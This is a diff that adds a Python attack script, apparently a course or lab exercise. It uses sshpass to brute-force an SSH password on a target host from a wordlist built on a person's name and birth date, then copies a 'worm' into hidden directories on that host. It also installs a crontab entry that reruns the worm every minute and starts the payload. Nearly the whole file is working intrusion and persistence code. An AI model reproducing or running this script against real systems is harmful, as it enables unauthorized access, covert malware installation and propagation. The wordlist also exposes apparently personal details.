@@ -1,0 +1,145 @@
+#!/usr/bin/env python3
+
+from collections import deque
+import subprocess
+from queue import Queue
+import glob
+import threading
+import concurrent.futures
+import sys
+
+MAX_WORKERS = 10
+
+
+def worker(x):
+    print("Trying '{}'".format(x))
+    while True:
+        try:
+            subprocess.run(
+                [
+                    "sshpass",
+                    "-p",
+                    x,
+                    "ssh",
+                    "-l",
+                    "attacker",
+                    "-oStrictHostKeyChecking=no",
+                    sys.argv[1],
+                    "exit",
+                ],
+                check=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            return x
+        except subprocess.CalledProcessError as err:
+            if err.returncode == 5:
+                return None
+            print("Retrying '{}'".format(x))
+
+
+def get_pass():
+    # TODO: remove Realtek_YH1999
+    words = [
+        "Realtek_YH1999",
+        "YueHan",
+        "Wang",
+        "YH",
+        "1999",
+        "0228",
+        "oscar",
+        "Realtek",
+        "@",
+        "_",
+        " ",
+    ]
+    q = deque([""])
+
+    futures = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as e:
+        while True:
+            done, not_done = concurrent.futures.wait(
+                futures, return_when=concurrent.futures.FIRST_COMPLETED
+            )
+            for d in done:
+                if d.result() is not None:
+                    for nd in not_done:
+                        nd.cancel()
+                    return d.result()
+
+            futures = list(not_done)
+            for _ in range(MAX_WORKERS - len(not_done)):
+                x = q.popleft()
+                futures.append(e.submit(worker, x))
+                for w in words:
+                    q.append(x + w)
+
+
+def send_ssh(pw, cmd):
+    subprocess.run(
+        [
+            "sshpass",
+            "-p",
+            pw,
+            "ssh",
+            "-l",
+            "attacker",
+            "-oStrictHostKeyChecking=no",
+            sys.argv[1],
+            cmd,
+        ],
+    )
+
+
+def send_worm(pw):
+    print("Sending Worm")
+    paths = ["~/Public/.Simple_Worm", "~/Desktop/.Backup"]
+    for path in paths:
+        print(path)
+        send_ssh(pw, "mkdir -p {}".format(path))
+        subprocess.run(
+            [
+                "sshpass",
+                "-p",
+                pw,
+                "scp",
+                "-r",
+                "-oStrictHostKeyChecking=no",
+                *glob.glob("./module/*"),
+                "attacker@{}:{}".format(sys.argv[1], path),
+            ]
+        )
+
+
+def install_cron(pw):
+    print("Installing Crontab")
+    send_ssh(
+        pw,
+        'echo "* * * * * ~/Public/.Simple_Worm/worm || ~/Desktop/.Backup/worm" | crontab -',
+    )
+
+
+def trigger_payload(pw):
+    print("Triggering payload")
+    send_ssh(
+        pw, "cd ~/Public/.Simple_Worm/ && ./worm",
+    )
+
+
+def main():
+    assert len(sys.argv) >= 2
+    password = get_pass()
+    print("=====")
+    print("Password='{}'".format(password))
+    print("=====")
+    send_worm(password)
+    print("=====")
+    install_cron(password)
+    print("=====")
+    trigger_payload(password)
+    print("=====")
+    print("Done")
+
+
+if __name__ == "__main__":
+    main()
